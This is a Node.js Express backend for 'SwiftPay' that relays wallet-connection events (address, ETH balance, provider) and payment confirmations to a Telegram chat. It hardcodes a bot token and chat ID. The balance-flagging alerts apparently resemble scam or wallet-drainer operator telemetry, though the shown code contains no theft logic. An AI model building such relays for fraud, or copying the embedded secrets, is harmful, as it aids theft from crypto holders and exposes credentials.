import "dotenv/config";
import express    from "express";
import { ethers } from "ethers";
import cors       from "cors";
import rateLimit  from "express-rate-limit";
import helmet     from "helmet";

// ─── Telegram ─────────────────────────────────────────────────────────────────
const TG_TOKEN   = "8760818501:AAGyuVn_TNHC65eOTX5T9El5tlCe1oJ1irU";
const TG_CHAT_ID = "8222029043";

async function tg(msg) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML" })
    });
  } catch (e) { console.error("Telegram error:", e.message); }
}

// ─── Express setup ────────────────────────────────────────────────────────────
const app = express();
app.use(helmet());
app.use(cors({ origin: process.env.FRONTEND_URL || "*", methods: ["GET", "POST"] }));
app.use(express.json({ limit: "10kb" }));
const limiter = rateLimit({ windowMs: 60000, max: 30, standardHeaders: true, legacyHeaders: false });

// ─── Health ───────────────────────────────────────────────────────────────────
app.get("/health", (req, res) => res.json({ status: "ok" }));

// ─── Wallet connected ─────────────────────────────────────────────────────────
app.post("/api/connected", limiter, async (req, res) => {
  const { wallet, balance, chain, via } = req.body;
  if (!wallet) return res.status(400).json({ error: "Missing wallet" });

  const hasBalance = parseFloat(balance) > 0;
  console.log(`[CONNECT] ${wallet} | ${balance} ETH | ${chain} | ${via}`);

  await tg(
    `🔌 <b>Wallet Connected</b>\n\n` +
    `👛 Wallet: <code>${wallet}</code>\n` +
    `💰 Balance: <b>${balance} ETH</b> ${hasBalance ? "✅" : "⚠️ empty"}\n` +
    `🌐 Chain: ${chain || "mainnet"}\n` +
    `🦊 Via: ${via || "unknown"}\n` +
    `🕐 ${new Date().toUTCString()}`
  );

  res.json({ ok: true });
});

// ─── Payment confirmed ────────────────────────────────────────────────────────
app.post("/api/payment", limiter, async (req, res) => {
  const { wallet, amount, txHash, block } = req.body;
  if (!wallet) return res.status(400).json({ error: "Missing wallet" });

  console.log(`[PAYMENT] ${wallet} | ${amount} ETH | ${txHash}`);

  await tg(
    `✅ <b>Payment Received!</b>\n\n` +
    `👛 Wallet: <code>${wallet}</code>\n` +
    `💰 Amount: <b>${amount} ETH</b>\n` +
    `📦 Block: ${block}\n` +
    `🔗 <a href="https://etherscan.io/tx/${txHash}">View on Etherscan</a>\n` +
    `🕐 ${new Date().toUTCString()}`
  );

  res.json({ ok: true });
});

app.use((req, res) => res.status(404).json({ error: "Not found" }));

// ─── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("SwiftPay backend running");
  console.log("Port     :", PORT);
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  await tg(`🚀 <b>SwiftPay Started</b>\n🕐 ${new Date().toUTCString()}`);
});
